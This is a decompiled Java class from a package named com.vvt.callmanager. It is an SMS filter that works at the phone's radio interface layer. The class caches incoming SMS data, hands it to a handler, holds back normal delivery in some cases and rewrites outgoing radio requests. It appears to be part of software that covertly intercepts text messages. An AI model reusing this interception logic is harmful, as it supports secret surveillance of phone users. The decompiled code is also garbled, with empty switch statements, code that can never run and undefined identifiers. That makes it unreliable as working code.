package com.vvt.callmanager.filter;

import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.Parcel;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;

 enum FilterSms$CallState$1
{
  byte[] cacheUnsolNewSms;
  
  FilterSms$CallState$1()
  {
    super(paramString, paramInt, null);
  }
  
  public void onEnter(Object paramObject)
  {
    this.cacheUnsolNewSms = null;
  }
  
  public Object onExit()
  {
    return null;
  }
  
  public FilterSms.CallState processResponse(Parcel paramParcel)
  {
    int i = 168430090;
    int j = 1;
    boolean bool = false;
    Handler localHandler = null;
    Object localObject1 = FilterSms.c(this.mFilterSms);
    int k = ((m)localObject1).c(paramParcel);
    switch (k)
    {
    }
    label262:
    for (;;)
    {
      if (j != 0)
      {
        localObject2 = this.mFilterSms;
        ((FilterSms)localObject2).c(paramParcel);
      }
      return this;
      FilterSms.a(this.mFilterSms, paramParcel);
      Object localObject2 = paramParcel.marshall();
      this.cacheUnsolNewSms = ((byte[])localObject2);
      j = 0;
      localObject2 = null;
      continue;
      localObject1 = l.a(paramParcel);
      k = ((l)localObject1).b;
      if (k != i) {}
      for (;;)
      {
        bool = FilterSms.b();
        if (!bool) {
          break;
        }
        break;
        j = 0;
        localObject2 = null;
      }
      localObject1 = l.a(paramParcel);
      k = ((l)localObject1).b;
      if (k != i) {}
      for (;;)
      {
        if (j != 0) {
          break label262;
        }
        localHandler = FilterSms.f(this.mFilterSms).a();
        localObject1 = Message.obtain(localHandler);
        Bundle localBundle = ((Message)localObject1).getData();
        String str = "DATA_NEW_SMS";
        byte[] arrayOfByte = this.cacheUnsolNewSms;
        localBundle.putByteArray(str, arrayOfByte);
        localHandler.sendMessage((Message)localObject1);
        bool = false;
        localHandler = null;
        this.cacheUnsolNewSms = null;
        break;
        j = 0;
        localObject2 = null;
      }
    }
  }
  
  public FilterSms.CallState processRilRequest(Parcel paramParcel)
  {
    int i = 8;
    int j = 1;
    Object localObject = FilterSms.c(this.mFilterSms);
    int k = ((m)localObject).b(paramParcel);
    switch (k)
    {
    }
    for (;;)
    {
      FilterSms localFilterSms;
      if (j != 0)
      {
        localFilterSms = this.mFilterSms;
        localFilterSms.d(paramParcel);
      }
      return this;
      localObject = this.mFilterSms;
      k = FilterSms.d((FilterSms)localObject);
      if (k > 0)
      {
        paramParcel.setDataPosition(i);
        j = paramParcel.readInt();
        localObject = i.a(i.o);
        ((Parcel)localObject).setDataPosition(i);
        ((Parcel)localObject).writeInt(j);
        this.mFilterSms.c((Parcel)localObject);
        j = 0;
        localFilterSms = null;
        localObject = this.mFilterSms;
        FilterSms.e((FilterSms)localObject);
        boolean bool = FilterSms.b();
        if (!bool) {}
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterSms$CallState$1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */